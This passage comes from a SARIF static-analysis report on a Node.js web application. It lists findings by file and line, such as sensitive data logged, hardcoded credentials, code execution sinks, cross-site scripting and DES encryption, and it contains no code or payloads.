                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 38
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 47
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Login.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 47
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Sensitive Data Leak: Sensitive Data is Leaked to Log in `Login.js:handleLogin`",
                        "text": "Sensitive Data Leak: Sensitive Data is Leaked to Log in Login.js:handleLogin"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8"
                    },
                    "rank": -1,
                    "ruleId": "sensitive-to-log/4edeaecd19b62a73663b81f4faf9302d",
                    "ruleIndex": 19
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "6abcb388ae266732bf114d56a463d9022b5afe506ee72895f2c4678962240674"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Order.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 70
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Order.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 88
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Order.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 85
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Order.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 93
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Order.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 93
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Sensitive Data Leak: Sensitive Data is Leaked to Log in `Order.js:processCC.<lambda>1`",
                        "text": "Sensitive Data Leak: Sensitive Data is Leaked to Log in Order.js:processCC.<lambda>1"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8"
                    },
                    "rank": -1,
                    "ruleId": "sensitive-to-log/f742f3b20eb30dc8fb480274cf7f3138",
                    "ruleIndex": 20
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "0f0dcc6ca61121a0f91002227358709ce212e67b20026bee4c43494cfb427e0b"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 80
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 81
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 82
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Login.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 82
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Sensitive Data Leak: Sensitive Data is Leaked to Log in `Login.js:login`",
                        "text": "Sensitive Data Leak: Sensitive Data is Leaked to Log in Login.js:login"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8"
                    },
                    "rank": -1,
                    "ruleId": "sensitive-to-log/43a4c36a3efa937851e850843f072833",
                    "ruleIndex": 21
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "59142a980f639ad4855781dbe1bc184e6f51605a2e6bcdd6c9a69930f3f3d065"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/server.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 12
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/server.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 52
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/server.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 51
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "note",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/server.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 51
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in `server.js`",
                        "text": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in server.js"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "low",
                        "score": "3"
                    },
                    "rank": -1,
                    "ruleId": "hardcoded-credentials/1f0b6912fdd2ca0330277d63a3a2a1ac",
                    "ruleIndex": 22
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "04898afc9672f2e9efa397f0e66ba217ec6037a59d6e34a0be1063f45e445a1c"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 19
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "note",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Login.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 19
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in `Login.js:encryptData`",
                        "text": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in Login.js:encryptData"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "low",
                        "score": "3"
                    },
                    "rank": -1,
                    "ruleId": "hardcoded-credentials/718c472dfdc218d3f7463ebb0caa8dca",
                    "ruleIndex": 23
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "b51b43fa257726416b6a92515c294a86b6d2b7a97f4f2fdecc676dd7496ace78"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Order.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 5
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Order.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 18
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "note",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Order.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 18
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in `Order.js`",
                        "text": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in Order.js"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "low",
                        "score": "3"
                    },
                    "rank": -1,
                    "ruleId": "hardcoded-credentials/cf758ef5d1e10346e5212ca889048731",
                    "ruleIndex": 24
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "482ea9911ef730edce9dc37f2a27f41ffad8d4b075f40efa0d1543b90ff01790"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Order.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 5
                                                    }
                                                }
                                            }
                                        },
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Order.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 13
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "note",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Order.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 13
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in `Order.js`",
                        "text": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in Order.js"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "low",
                        "score": "3"
                    },
                    "rank": -1,
                    "ruleId": "hardcoded-credentials/96ed770a28f793bd573308ba7ef683ed",
                    "ruleIndex": 25
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "2daa1d2ba1450b1c73404958742a031315be51ba3a3c35131da06eb28287c08f"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "db-init.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 2
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "db-init.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 2
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Remote Code Execution: Execution of Non-Constant Code in `db-init.js`",
                        "text": "Remote Code Execution: Execution of Non-Constant Code in db-init.js"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8.5"
                    },
                    "rank": -1,
                    "ruleId": "warning-sink-execute-code/01d670f24fbaab3b2733c01cdc16e24b",
                    "ruleIndex": 26
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "760ea6f58fc8cab1627817784665c11aef618f8a836295ec7c818dd6d00a6c6e"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/server.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 31
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/server.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 31
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Remote Code Execution: Execution of Non-Constant Code in `server.js:<lambda>0`",
                        "text": "Remote Code Execution: Execution of Non-Constant Code in server.js:<lambda>0"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8.5"
                    },
                    "rank": -1,
                    "ruleId": "warning-sink-execute-code/da3d6741cca13a8481a55cd99e75da83",
                    "ruleIndex": 27
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "84b7dc2f00fc659f510100b7f9fb546b8812e380a9f3711d1f967e9688e05cc9"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/views.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 19
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/views.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 19
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Remote Code Execution: Execution of Non-Constant Code in `views.js:<lambda>0.<lambda>3`",
                        "text": "Remote Code Execution: Execution of Non-Constant Code in views.js:<lambda>0.<lambda>3"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8.5"
                    },
                    "rank": -1,
                    "ruleId": "warning-sink-execute-code/a6ccbed8aed4756d11bfa11399570f03",
                    "ruleIndex": 28
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "dc196f289178b9261a6468add306b981a8f57d4490021b5d33d656dbe16e0562"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/views.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 7
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/views.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 7
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Cross-Site Scripting: Non-Constant HTML Content in `views.js:<lambda>0.<lambda>1`",
                        "text": "Cross-Site Scripting: Non-Constant HTML Content in views.js:<lambda>0.<lambda>1"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8"
                    },
                    "rank": -1,
                    "ruleId": "warning-sink-html/a229495bcdbbc908d55189ad7254b387",
                    "ruleIndex": 29
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "0afedf228407eb90a638862b2ce5d598015913ee34645b87e6a8aac03ca886c2"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/ImageLookup.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 11
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/ImageLookup.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 11
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Cross-Site Scripting: Non-Constant HTML Content in `ImageLookup.js:get`",
                        "text": "Cross-Site Scripting: Non-Constant HTML Content in ImageLookup.js:get"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "high",
                        "score": "8"
                    },
                    "rank": -1,
                    "ruleId": "warning-sink-html/ebbe1949a2097c63b00f92da013e4554",
                    "ruleIndex": 30
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "3c8cbbb802bb8d34819d64ad5e9968ef08c897ea1bcbaca92354f8fd81a9b333"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/server.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 46
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "note",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/server.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 46
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Denial of Service: Uncontrolled Resource Consumption in OSS Express Body Parser in `server.js`",
                        "text": "Denial of Service: Uncontrolled Resource Consumption in OSS Express Body Parser in server.js"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "low",
                        "score": "2"
                    },
                    "rank": -1,
                    "ruleId": "oss-express-body-parser/21b910fd06e113a74430fcc5ad47c249",
                    "ruleIndex": 31
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "1459e9e74e5c3ad7f3dffa6ab0cf6c4d86f6235a42a9454dbbaf01007bac876a"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Login.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 17
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Login.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 17
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Weak Cipher: Use of a Broken Cryptographic Algorithm in `Login.js:encryptData`",
                        "text": "Weak Cipher: Use of a Broken Cryptographic Algorithm in Login.js:encryptData"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "critical",
                        "score": "9"
                    },
                    "rank": -1,
                    "ruleId": "weak-crypto-des/bbc5dfa20c1b2b447cc51fe9a3d98566",
                    "ruleIndex": 32
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "1c5e737dac9dec2a1ae03f4f740b2e34d45ea6e6dbc9061e49dc81f09feaadb0"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Order.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 13
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Order.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 13
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Weak Cipher: Use of a Broken Cryptographic Algorithm in `Order.js:encryptData`",
                        "text": "Weak Cipher: Use of a Broken Cryptographic Algorithm in Order.js:encryptData"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "critical",
                        "score": "9"
                    },
                    "rank": -1,
                    "ruleId": "weak-crypto-des/eb715e59c483d563f7ca043e0dba964b",
                    "ruleIndex": 33
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "2fc9405f3f0f15751edd2f039421db3d26751efac10db5db89144b71cdbf1382"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/Controllers/Order.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 18
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "error",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/Controllers/Order.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 18
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Weak Cipher: Use of a Broken Cryptographic Algorithm in `Order.js:decryptData`",
                        "text": "Weak Cipher: Use of a Broken Cryptographic Algorithm in Order.js:decryptData"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "critical",
                        "score": "9"
                    },
                    "rank": -1,
                    "ruleId": "weak-crypto-des/6fcdbf1a409a61749dc93fe38562677e",
                    "ruleIndex": 34
                },
                {
                    "fingerprints": {
                        "evidenceFingerprint": "373912880fa25bb8f17929de27a594667fa6817c92f2c6ccdab0adeb80d8775d"
                    },
                    "baselineState": "new",
                    "codeFlows": [
                        {
                            "threadFlows": [
                                {
                                    "locations": [
                                        {
                                            "executionOrder": -1,
                                            "importance": "important",
                                            "index": -1,
                                            "location": {
                                                "id": -1,
                                                "physicalLocation": {
                                                    "artifactLocation": {
                                                        "index": -1,
                                                        "uri": "src/server.js"
                                                    },
                                                    "region": {
                                                        "byteOffset": -1,
                                                        "charOffset": -1,
                                                        "snippet": {
                                                            "text": ""
                                                        },
                                                        "startLine": 10
                                                    }
                                                }
                                            }
                                        }
                                    ]
                                }
                            ]
                        }
                    ],
                    "kind": "fail",
                    "level": "note",
                    "locations": [
                        {
                            "id": -1,
                            "physicalLocation": {
                                "artifactLocation": {
                                    "index": -1,
                                    "uri": "src/server.js"
                                },
                                "region": {
                                    "byteOffset": -1,
                                    "charOffset": -1,
                                    "snippet": {},
                                    "startLine": 10
                                }
                            }
                        }
                    ],
                    "message": {
                        "markdown": "Fingerprinting: Exposure of Software Stack in X-Powered-By HTTP Header in `server.js`",
                        "text": "Fingerprinting: Exposure of Software Stack in X-Powered-By HTTP Header in server.js"
                    },
                    "properties": {
                        "issue_confidence": "HIGH",
                        "issue_severity": "low",
                        "score": "1"
                    },
                    "rank": -1,
                    "ruleId": "express-powered-by/7a7a7a2b239735faddbd9d180662b6d4",
                    "ruleIndex": 35
                },
                {
                    "fingerprints": {
